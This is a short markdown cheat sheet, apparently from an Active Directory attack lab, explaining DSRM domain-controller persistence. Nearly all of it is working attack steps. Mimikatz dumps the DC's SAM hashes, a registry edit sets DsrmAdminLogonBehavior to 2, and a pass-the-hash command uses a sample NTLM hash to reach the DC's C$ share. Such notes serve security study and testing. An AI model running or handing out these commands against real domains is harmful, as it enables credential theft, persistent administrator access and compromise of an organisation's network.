# DSRM (Directory Services Restore Mode)
- DSRM is Directory Services Restore Mode.
- There is a local administrator on every DC called "Administrator" whose
password is the DSRM password.
- DSRM password (SafeModePassword) is required when a server is
promoted to Domain Controller and it is rarely changed.
- After altering the configuration on the DC, it is possible to pass the
NTLM hash of this user to access the DC.

# Dump DSRM password (needs DA priv)
```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dcorp-dc
```

1. Find DSRM local administrator, Since it is the local administrator of the DC, we can pass the hash to authenticate.
2. Change logon behavior for DSRM account
```powershell
Enter-PSSession -Computername dcorp-dc New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```
By setting the "DsrmAdminLogonBehavior to 2" we can then allow the DSRM administrator we found to perform pass the hash
3. Pass the hash
```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'

ls \\dcorp-dc\C$
```